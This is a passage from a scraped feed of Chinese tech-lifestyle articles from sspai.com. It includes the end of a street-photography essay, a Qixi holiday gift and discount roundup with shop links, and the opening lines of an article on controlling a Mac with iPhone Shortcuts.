src=\"https://cdn.sspai.com/2021/06/28/2ef2809d38184879b6896cef3a436549.jpg\"><figcaption>人类还是很可爱的啊</figcaption></figure><p>在机场等飞机时，拍摄传送带上路过的形色匆匆的行人。你根本想象不到发现我在拍照之后有多少人在传送带上给我摆各种各样的奇怪的 pose。所以人类还是很可爱的啊，我想这张照片告诉我的，不要害怕陌生人，去相信他们。</p>\n<h2>做一个讲故事的人</h2>\n<p>关于「讲故事」这件事，我想把它分为两部分。一类是人文，一类是城市。关于照片中的故事，其实有点像语文考试中的阅读理解，大概所有艺术相关的品类都有一样的内核。关键在于观者怎么用自己的经历阅历去解释这张照片，同时能从照片中感受到什么。</p>\n<h3>人类很可爱</h3>\n<p>接上文中提到的「人类很可爱」这个事情继续往下说。如果你的观察力足够敏锐，你可以看到一些很有趣的场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/6eb05331bf84153b6795e1d2d49a1dc5.jpg\"><figcaption>地铁站趣事</figcaption></figure><p>这张照片拍摄于慕尼黑的地铁站。如果是让我为这张照片写一个故事的话，可能是这样的：</p>\n<blockquote><p>请叫我埃德加，这并不是我的真名。我今年还不到70岁，我的女儿就已经开始处处紧张我的一举一动了。我只不过是想看看，十年前我掉在特蕾西亚地铁站台的眼镜是否还在那里。</p></blockquote>\n<p>我把照片发到朋友圈，评论区的画风是这样的：</p>\n<blockquote><p>我叫埃德加，是个侦探小说作家，多年伏案严重损害了我的视力，当我低头查看掉在轨道缝隙里的病历卡，女友突然伸出年轻而柔嫩的手，将我推向了无尽的黑暗……</p></blockquote>\n<p>还有这样的：</p>\n<blockquote><p>对，你没看错，图上戴着线帽的就是十年前天真烂漫的我 - 安吉拉，当时年幼的我没想到会成为一起惨案的亲历者，更没想到多年后会在朋友圈再次被迫重温这一噩梦……</p></blockquote>\n<p>这就充分说明了照片只是人心中所想的投射，另外，我似乎应该好好反思一下我的朋友圈了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/5688ab5302f17171441a2e06c7dad516.jpg\"><figcaption>秀恩爱秀的我头秃</figcaption></figure><p>这张照片是一个阳光明媚的下午，即使是这样，有的人满脸笑意，也有的人苦大仇深。照片中画面中央的情侣给人一种非常阳光明媚的感觉，而与之形成鲜明对比的是后面的光头大哥，捂着头，似乎被狗粮晃到了眼睛。当然事实是完全相反的也不是没有可能，而且，正如前面所说的，这一切都在于观者看待这张照片的角度。</p>\n<h3>城市的风貌也被人类影响</h3>\n<p>相对于人文篇来说，城市篇可能会更多的表达城市和人之间的关系。人是怎么样去影响一座城市的风貌，以及一座城市的风貌怎么反应这个城市人民的气质。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/859bb8b05364e19c41ba38af5488a006.jpg\"><figcaption>好想吃</figcaption></figure><p>这张照片拍摄于广州。广州作为我心目中的美食之都，没有什么更能比美食能代表这座城市了。这是我在广州的第一个早上，在这家店吃完早茶出来，就看到门口这个大爷盯着橱窗里挂着的烧鹅目不转睛。照片中的主题是橱窗里的美食，而人物更是从一旁佐证了「看起来好好吃」这个事实。在广州的每一餐，吃的简直让人惊叹，作为一个北方人，而且是很北的北方人，竟然对这个城市的美食流连忘返。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/d5f4d73889690e7da97f65ca855a3980.jpg\"><figcaption>好闲适</figcaption></figure><p>美食之外，「闲适」也是我对这座城市的一个很深的感受。尤其是穿梭在老城的街巷里，仿佛看到了时间的停止，穿梭回了之前的时间。平时生活在北京，虽然在河边偶尔也可以看到钓鱼的大爷们，但是往往是装备齐全的不得了，仿佛一场军备竞赛，就没有广州这个钓鱼者来的闲适。仿佛像在告诉我，我就随便吊吊，鱼什么的无所谓的。传达出来的那种真正享受生活的感觉真是让我这个生活在快节奏城市里的人羡慕不已。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/b73d9a3044af6a2252ea3e392accb3fb.jpg\"><figcaption>西宁</figcaption></figure><p>西宁作为青海的首府，在一众省会城市中并不显眼。通常作为游客领略西北风光的中转站而存在。因为疫情的关系，清真大寺已经很久没有开门了，照片中的老人神情有些落寞。当然我们那次旅行在西宁也是作为中转的行程，整个城市给人一种非常平静的、甚至有些萧条的感觉，这和照片中呈现出的场景是一致的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/99b1620d2f6d773aa8bcfa0f32c5de1a.jpg\"><figcaption>巴塞罗那</figcaption></figure><p>如果用一些词语来形容巴塞罗那的话，整体风格大概就是：阳光、沙滩、大海、音乐、热情。在巴塞罗那住了一周，适逢当地一个音乐节，在各个街巷都有不同风格的音乐趴，真是让人难以忘怀的一个夏天。照片是一个下午在海边吹海风的时候拍的，一群年轻人在打沙滩排球。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/ecbb637aed790b769e5033e4f540a18e.jpg\"><figcaption>罗马</figcaption></figure><p>如果说巴塞罗那能代表夏日的热情的话，那么罗马会更有一种文化上的厚重感。照片上是一组在写真的艺术系学生（我猜）。我觉得大部分人应该和我有相同的猜测，因为照片中的主体，这群学生，有的在抬头看向同一个地方，有的在本子上写划一些什么东西，还有一个在用笔似乎是在对比尺寸之类。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/6a779d1a434a64807e8ac8f2be55573a.jpg\"><figcaption>德国科隆</figcaption></figure><p>看到这里你一定会好奇，现在明明是城市篇为什么是一幅人像。之前说过，照片更多的是人思想的投射。在德国生活这么多年，我觉的这张照片最能代表我对德国的印象。照片拍摄于德国科隆的摄影器材展，照片中的主角，表情严肃冷漠，西装革履透露着专业度，胸口的铭牌说明了身份，这和我心目中德国的样子就是一样的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/6109c40eee4497be3c09b55d7941979b.jpg\"><figcaption>北京</figcaption></figure><p>好多人问我为什么喜欢北京，我给出的答案就在这张照片里。北京最令我心向往之的就是他的融合性，有着胡同这样的传统街道，也有着国贸那些钢筋丛林。文化上的北京也是，虽然本应该是一座冷漠且就事论事的国际大都市，但却处处充满着人情味。我想，是这个地方的人，给这座城市带来了不一样的风情。高楼大厦可以复制，胡同小巷可以重建，可是一个城市人民的风情，是无法被复制的，也是一座城市的魅力所在。</p>\n<h2>一些不成熟的小思考</h2>\n<p>街头摄影这件事，说起来是一件既简单又复杂的事。简单的点在于，你只需要拿起相机按下快门；而复杂的点在于，你用快门捕捉到的这一刻想要传达出什么。</p>\n<p>对于街头摄影，上面我零零散散写了一些我认为对我自己来说比较重要的点，并以自己的照片作为例子。街头摄影不同于商业摄影，传达的更多的是一种原始的、未加修饰的情景和情绪，少了很多的精致感。也许这也是我喜欢街头摄影的原因吧。</p>\n","link":"https://sspai.com/post/66923"},{"title":"七夕将至，10+ 件生活好物送 TA 也能送自己","date":"2021-08-09 07:06:18","description":"\n<p>回想起上次商店打折，仿佛还在昨天，说起来商店也的确经常打折就是了。这不，我们又有了促销的全新理由：七夕（8 月 14 日）将要到来，不管你是有人陪还是独自一人，我们都挑选了一系列或适合送人 / 送己的商品，送别人一份精致礼品可以给 TA 惊喜，送自己一份好物也可以让生活充实快乐。</p>\n<p>⏰ <strong>活动时间：</strong>8.9 ~ 8.13</p>\n<h2>😮 送人给 TA 惊喜</h2>\n<h3>意外设计小时光便携钢笔・花信礼盒套装</h3>\n<p><a href=\"https://item.taobao.com/item.htm?id=652277527563\" target=\"_blank\">标准版</a> ¥295.2 起，<a href=\"https://item.taobao.com/item.htm?id=651536481128\" target=\"_blank\">花信礼盒版</a> ￥358.2 起</p>\n<p>@北鸮：与之前我在 <a href=\"https://sspai.com/post/67584\" target=\"_blank\">文章</a> 中推荐的大部分钢笔不同，意外设计本身并不是文具厂商，作为设计工作室，他们的钢笔也是从设计入手。我觉得这样的选择其实非常明智——在成本有限制的情况下，就应该把钱花在自己最擅长的地方，把优点尽可能放大。他们还为这款钢笔搭配了一个永生花花历礼盒，可以说，这是一款非常适合作为礼物的钢笔。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/072d6144ffac564b268484fb56435894.jpeg\"></figure><p>礼盒内除了钢笔本体与墨囊，还包括一张贺卡，以及一份带有永生花的台历式便签，便签本靠磁吸连接，写完可以替换或是换成其他装饰品。你可以把一些想说的话写在贺卡上，或是写在便签上，把它送给你爱的人，让黄铜与实木陪伴你们走过每一寸时光。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/68006\" target=\"_blank\">新玩意 072 - 意外设计小时光便携钢笔・花信礼盒套装</a></p>\n<h3>COSTAR 天生一对·圆满项链</h3>\n<p>情侣款最低 ¥515 到手 <s>原价 ¥598 起</s>，月亮 / 太阳单件最低 ￥323 到手</p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=651757789077\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@包包呀嘿：COSTAR 天生一对 · 圆满项链很符合我送礼物的思路。它选用了深海新西兰 4A 级鲍鱼贝，每一片都是独一无二、浑然天成的天然纹理。做成一对项链，一半是日，一半是月。拼在一起还是一个完整的圆，象征着圆满。日月的搭配，正如这对项链的名字一样，天生一对。日月长久，时光永在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c45p4e5b34t8oic3r48g.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>天然贝壳的纹理，确实有一种神秘和迷人的感觉，梦幻的极光色，从碧绿到宝蓝，在光的加持下，反射出不同的色彩，美丽💅。极简的造型更能衬托出它的纯粹，也容易搭配。无论休闲的白 T 还是美丽的小裙子都能搭配在一起。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/68115\" target=\"_blank\">新玩意 073 - COSTAR 天生一对·圆满项链</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2f5089ffef919b67c21e735a020937a1.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>七夕定制积木方仔</h3>\n<p>单人套餐 ￥299，双人套餐 ￥520</p>\n<p>🛒 <a href=\"http://brickme-studio.mikecrm.com/7B3w4cI\" target=\"_blank\">点这买 &gt;</a></p>\n<p>无论是哪个品牌的积木，方头仔系列都相当畅销。通过简单的拼搭就能组出一个可爱的小人偶。不过这些方头仔往往都有固定的拼搭步骤，想要个性化自定义又比较困难，方仔私人定制积木人偶让你可以定制属于自己的人偶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/d1b480bd737386c240ec1739859d0dc3.png\"></figure><p>七夕快要到了，无论你是想送自己还是另一半，他们提供了单人 / 双人套装相框定制服务，只需要一张照片，就能把自己和另一半的形象做成独一无二的积木人偶，表达你别样的巧思。</p>\n<p>PS. 少数派颁发给年度作者的特别礼物也是通过他们定制了类似的一套~</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/3d526a63dd396985317f01da13961b74.gif\"></figure><h3>明基 ScreenBar Plus 屏幕挂灯航海王联名限定款</h3>\n<p>￥999</p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2oix4pdb40kwg?step=1\" target=\"_blank\">点这买 &gt;</a>（10 号十点开售）</p>\n<p>明基 ScreenBar Plus 挂灯，现以海贼王联名款呈现！除了保留 ScreenBar Plus 优异的特性之外，定制版采用了金色灯体，上面「行驶」着迷你版的梅利号。此外也额外附送了航海王主题的相关配件，里面都有什么？等到 10 号开售你就知道了，该款全球限量 2000 台，喜欢的朋友可能要抓紧。</p>\n<p>ScreenBar Plus 特殊的非对称光学设计，可以实现有效控制光路，屏幕不反光，并且将台灯控制器独立成了可移动的控制旋钮，在人机交互和光源检测上都有很好的使用体验与效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/f3b60520a7e269d670eedf59bd10d7e9.jpg\"></figure><h3>iQunix M80 键盘</h3>\n<p>￥459 <s>原价￥499</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=645015794911\" target=\"_blank\">点这买 &gt;</a></p>\n<p>谁说「铝厂」出品就只能外观方正冷冰冰？这款 iQunix M80 一改之前的风格，走起了可爱的猫咪路线，黄 / 蓝 / 粉三色可选，除了猫耳造型的键帽，甚至还有硅胶材质的捏捏乐。80 布局的温馨白光，连接方式为 Type C + 蓝牙 5.0 的双模，对于 Mac 用户同样适用，可以通过快捷键切换到 Mac 布局。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/18/6d80aa698d671bff676a9b11f4eb3cf7.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2>🥰 送己好好生活</h2>\n<h3>Chakolab 不锈钢吸管保冷杯</h3>\n<p>¥99 <s>原价 ¥158</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/26xspu7myiyj4\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@Welber：我承认，最开始我是被这款杯子的颜值所吸引，所以压根没有在意它的产品介绍。收到产品、打开包装，实物简直是太好看了！水杯一共有四款颜色，我选择的是「阳光芥末」配色，非常的清新，很适合夏天。杯身是磨砂涂层，杯体是不锈钢材质，底部还有防滑设计，整体上做工还不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/e7bbb49281786e3ab0e798be12603510\"></figure><p>新杯子到手以后第一件事，肯定是清洗。这款水杯的每一部分都是可以拆开独立进行清洗，非常方便。夏天天气炎热，装盛一些咖啡、牛奶之类的饮品，如果不及时清洗肯定容易产生异味，所以可拆洗的设计还是非常必要的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/fb25f8452d3b676e74e82a3a05cc510f\"></figure><p>吸管水杯通常都不可以装热水，因为热水会让杯子内部的气压过高从而导致热水喷溅。但我在装冷水后也发现，水杯并不能完全做到百分百的滴水不漏。至少可以保证的是，如果你是一个喜欢把水杯放在电脑旁边的人，用这款水杯喝水可以大大降低把水杯打翻在电脑上的概率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/95dd110c65561e937a0343c245d454e7\"></figure><p>这款水杯不光是一个吸管水杯，还是一个保冷杯，这对于炎炎夏日来说是一个非常大的亮点。我也大致测试了一下保冷效果：我从超市里买来的冰可乐，放在室内大约4小时，拿起来喝的时候还是很冰。拿到室外也许保冷效果会差一些，不过我实在不想去室外测试啦😅</p>\n<p>总体来说，这款水杯很适合日常放在办公桌上喝水，偶尔拿来放一些冰镇的饮料。不过就冲着这个颜值，我就已经忍不住要下单了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/240f81fd69bab57c942a5e186da044ef.jpg\"></figure><h3>猜不到设计喵爪风铃</h3>\n<ul>\n<li>Mini 款￥188 <s>原价￥208</s>\n</li>\n<li>长款￥198 <s>原价￥218</s>\n</li>\n</ul>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/365af0fei2ge8\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@ThomasTeng：小时候关上房门偷偷玩游戏时，总希望能有人帮忙在门口把风，遇到风吹草动立即响应，但现实是残酷的，如今的我们很难再找到一位可靠的「看门人」。人没找到，但我找到了一只猫，确切地说是一只可爱的猫爪铃铛，来自「猜不到设计」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/b9a66b1f8b69b93847d8ed1008538efe\"></figure><p>给我的第一印象就是「精致」「可爱」，包装上一幅网红招财猫标签彰显了它的饰品属性，打开包装，铃铛周围使用黑色缓冲棉包裹，底部附有三片 3M 背胶，可以将它固定在木门或墙面上。底部的金属螺柱实际包含了磁铁，可以很牢固地吸附在冰箱或防盗门上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/e29fc707062123962abe59a507ce8781\"></figure><p>作为「前」实木家具定制者，我第一时间就被它的做工所吸引，先来看一下这款铃铛的结构设计。</p>\n<p>看似简洁的实木造型，在「猫爪」处使用了雕刻镶嵌工艺，深色猫爪与原木色撞色搭配，确保了结合处的过渡整洁。</p>\n<p>作为一个强调「手作」的品牌，猜不到设计并没有盲目追求全手工制作，根据我的粗浅观察，这款铃铛多处运用了「标准化」的加工方式，在降低成本的同时提供给我们更加一致的体验。比如，使用 CNC 雕刻带来大小形状一致的装配孔及「猫爪」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/4608f8c7f9a65608400f49f1689c537e\"></figure><p>再来看一下它的材质搭配，主材使用了沙比利木，铃铛使用了黄铜材质，非常经典的搭配方式，既复古又突出了物品的质感。底部使用尼龙螺钉固定铃铛本体，耐腐蚀且能和实木贴合紧密，用于悬挂铜球的位置使用了金属加固，避免木质孔的磨损，后部安装的金属连接件同时起到了磁铁的作用。最后，再看一下它的表面处理，使用了我最爱的的木蜡油涂装，这样能够充分发挥实木材质纹理带来的上佳手感。</p>\n<p>那么，这么可爱的猫爪铃铛用在哪里比较好呢？我认为有这么两大「功效」：</p>\n<ul>\n<li>开门检测（门铃）：把它贴在房门上，有人推门进来时可为我们提供约 1s 的时间用于「调整状态」，以最友好的面貌迎接来客。</li>\n<li>偷吃检测（冰箱门）：当夜深人静之时，为了获取创作灵感，我轻手轻脚来到厨房，打开冰箱门拿出冷藏已久的快乐水…… 等等，好像哪里不对？</li>\n</ul>\n<p>总之，这么一只可爱的猫爪铃铛，能够适时或不合时宜地发出据说经过专业调音的清脆响声，能为我们增添不少生活中的快乐，确信。</p> <h3>小仓熊 小白鞋清洁剂</h3>\n<p>￥24.9 <s>原价￥39</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=652981295164\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@SamWanng：正所谓买鞋穿鞋特别爽，擦鞋洗鞋只想躺——鞋子的日常清洁着实令人头痛。过去几年，我先后尝试过鞋子的清洁服务，也购买过不少清洁产品。</p>\n<p>清洁服务价格高，也很难找到称心的。清洁产品市面上倒是有不少——清洁泡沫、清洁啫喱，这类产品做得都比较成熟了，清洁效果也还都不错。但是这类产品大多数使用起来都比较繁琐，比如用水稀释啫喱液，气泡后再涂抹在鞋子上用刷子清理。</p>\n<p>前两天收到这套小仓熊的清洁套装就比较简洁方便——它的清洁工具和清洁剂是一体的——清洁剂从刷头处挤出，然后很自然地使用刷头在污渍处擦洗起泡，清洁完毕后用干抹布擦去污渍即可。因为刷头是纳米海绵和刷子的组合，可以清洁大部分材质的鞋面——编织（帆布鞋）、皮面（皮鞋、板鞋）、飞线（Yeezy、跑鞋）等均不在话下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f4f90d8cae9f7c510b8164e406fac6ff\"></figure><p>这个套装除了清洁剂还提供了一瓶增白剂，这就非常方便喜欢穿帆布鞋和小白鞋的朋友。帆布鞋白色的鞋头以及小白鞋在穿着已久的情况下，会出现氧化、色素沉淀的问题——没之前那么白了，那么使用增白剂就可以让它容光焕发，昨日重现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/4c47df2068f7c3cbd34a3b6b08610a8b.jpg\"><figcaption>左：清洁后使用增白剂 右：仅清洁 @问路的帆布鞋</figcaption></figure><p>总之在这个价位里，这套鞋子清洁剂确实是好用、好看又具性价比。如果你有需求，不妨买一套试试。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/02e373ec818676c1f2889abf3af098f3.gif\"><figcaption>办公室同事疯狂擦鞋</figcaption></figure><h3>Bgest 自动真空保鲜罐</h3>\n<p>￥199 起 <s>原价￥239 起</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/1y8w2b7e9ywao\" target=\"_blank\">点这买 &gt;</a></p>\n<p>食品保鲜永远是厨房的主要需求之一，而来自 Bgest 这款自动抽真空罐可以减缓氧气与食物的接触，延长保鲜 3-5 倍。它不借助外部设备，只需要按下盖子上的开关，就可以一键真空，采用磁吸充电方式，以一天开盖一次计算，充电一次可以使用半年，各类的柴米油盐都可以分类摆放，整齐又美观。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/852e73aff046aba0cf59fd3fe50ef6de.jpg\"></figure><h3>UKA 玻璃保温 / 保冷马克杯</h3>\n<p>￥75 <s>原价￥89</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3f09oejew1xqo\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@煎饼：为了防止咖啡变冷，我付出过很多努力，比如购买电加热杯垫、毛线杯套等等，但都因为麻烦放弃了。同时，大部分保温杯都是随身杯的样式，不锈钢内胆、无法直接在微波炉里加热、口径很小且深不易清洗……</p>\n<p>最近在我派商店发现的 UKA 保温马克杯，刚好解决之前的问题，保温保冷这些基础功能就不说了，最方便的是可以直接放在微波炉里加热，能少洗一个锅子或水壶非常提高懒人的幸福感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/d45b7ccd33787c8d0fbd5be176859cee.jpg\"></figure><p>采用高硼硅玻璃内胆，在酸碱高温环境下非常稳定，不会向杯容物中释放有害物质，倒入热水也不会烫裂，玻璃材质和大口径设计更容易清洁。</p>\n<p>除此之外，采用双层杯体结构不怕摔，不用经历喜欢的玻璃杯摔碎的痛苦，底部还有硅胶防滑圈，虽然是个带盖保温杯，但依然很轻巧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/23d1908e999c8207ada1d3795805987a.jpg\"></figure><p>当然，现在正是 30 几度的夏天，能为冰饮料保冷才是最重要的啊。</p>\n<h3>UKA 冷鲜便当盒</h3>\n<p>￥99 <s>原价￥119</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2xf592otfswzk\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@阿娇：见到 UKA 的第一眼吸引我的一定是它的颜值，表面是磨砂材质，散发着一种高级感，我选择了清新又舒服的浅绿色。夏天带饭最担心的是饭菜变质，正常情况都是带午饭，早上做好到中午吃饭时间至少间隔 3-4 个小时，如果没有良好的冷藏环境食物很容易在高温环境下馊掉，UKA 最大的功能点是中间的保冷模块，既有分类功能还能让食物保持最佳状态。盒体可放入微波炉，自带硅胶密封圈，盒体外有固定带，可有效避免流出汤水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/fac64f8d4da62a01f6f3ad52e22d0f6c.jpg\"></figure><p>最让我喜欢的是蘸料盒的存在既可以装东西还能起到隔层的作用。除带饭外跟小伙伴出去野餐装水果食物也是优选。（偷偷讲一句，本产品最适合健身减肥的小伙伴）</p>\n<h3>Eraclean 隐形眼镜 / 美瞳清洗盒</h3>\n<p>￥159 <s>原价￥199</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=645389759512\" target=\"_blank\">点这买 &gt;</a></p>\n<p>对于佩戴隐形眼镜的人士，日常的携带和清理确实是一个问题，而来自 EraClean 的这款隐形眼镜清洗盒，配合护理液使用，通过高频超声波震荡的方式进行清洁冲刷，不光可以用作清洗使用，还能充当存储盒。机身采用了小巧椭圆形的外观设计，IPX7 级别的防水，采用了磁吸的充电设计，只需要两分钟，就可以让蛋白质、脂质、灰尘等剥离，实现护理便携的二合一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/18/14f9674defffe77513d832acbc59207b.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2>这些老朋友也在打折……</h2>\n<p>🏖️ <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;catId=1608317477&amp;keyword=%CF%C4%C8%D5%CF%DE%B6%A8&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买夏日限定渔夫帽 / T 恤&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/e7ffaf566aa5532162b1e346816410bf\"></figure><p>👩‍💻 <a href=\"https://item.taobao.com/item.htm?id=625968670784\" target=\"_blank\">点这买 Mac 背后的你钥匙链&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/897537668fe0a0454cf55d2acc30bfbc\"></figure><p>🧴 <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=%D6%BB%C7%E1&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买只轻 男士护肤系列&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/a5830bcdc52d7c25032de4c471b6d611\"></figure><p>⌨️ <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=Keychron&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买 Keychron K1 / K2 机械键盘&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/d1f04ebb1605f0f9735c0f328c3e3b0e\"></figure><p>⌨️ <a href=\"https://item.taobao.com/item.htm?id=634310719101\" target=\"_blank\">点这买鲨鱼君茶包套装&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/c6415fd6102b68513930e4a493e9b250\"></figure><p>🔋 <a href=\"https://item.taobao.com/item.htm?id=624918843222\" target=\"_blank\">点这买 Zendure SuperMini 移动电源&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/c91e915604a1bc05d1292b27d864c6fa.png\"></figure><p>⚡ <a href=\"https://item.taobao.com/item.htm?id=651246267943\" target=\"_blank\">点这买电派 G4 无线充电底座&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/3017b99d227db502510365ad3516903e.png\"></figure><p>🔩 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3nmr0pqz7huy8?step=1\" target=\"_blank\">点这买 Wowstick 手动 / 电动 螺丝刀套装&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/6dd57adc33e39fb704e50b184a059e31\"></figure><p>🔪 <a href=\"https://shop11352888.m.youzan.com/wscshop/showcase/feature?alias=oKMVAS664X&amp;kdt_id=11160720\" target=\"_blank\">点这买 Slice 开箱刀&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/1df79a291993820851e08885fe5df017\"></figure><p>🚀 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2fwh01k2qi7nk\" target=\"_blank\">点这买黄油猫太空舱充电宝&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/a0b8708a768cce0cde43bc9df1253da5.png\"></figure><p>🎼 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2g2oslenjwgcg\" target=\"_blank\">点这买 DONHA 口琴项链&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/dc48448371422a0708d96899a7e5b803\"></figure><p>💄 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3nsuo52py7kf4\" target=\"_blank\">点这买 Lofree 尾巴化妆刷套装&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/f90c153efbb08c9871853685fe3643d2\"></figure><p>🦷 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/26xro93cnj5io\" target=\"_blank\">点这买素士冲牙器&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/article/ed86cd9ae978b95b8375d8d40dc40ed3\"></figure><p>&gt; 关注少数派 <a href=\"https://shop549593764.taobao.com/index.htm?spm=2013.1.w5002-18497266160.2.2fa346beBU2yc8\" target=\"_blank\">官方周边淘宝店</a> / <a href=\"https://weibo.com/u/6293993963\" target=\"_blank\">@吃派的水獭</a>，了解更多新奇有趣的科技产品 🏬</p>\n<p>&gt; 提升工作效率，掌握生活技巧，来少数派 <a href=\"https://shop184770392.taobao.com/index.htm?spm=a1z10.1-c.w5002-23492264167.2.528c2ac4r8butZ\" target=\"_blank\">正版软件淘宝店</a> 看看 💾</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68166"},{"title":"巧用快捷指令开关机，让 iPhone 成为 Mac 的遥控板","date":"2021-08-09 06:30:03","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h3>前言</h3>\n<p>在生活中的一些场景，可能需要使用 iPhone 控制 Mac 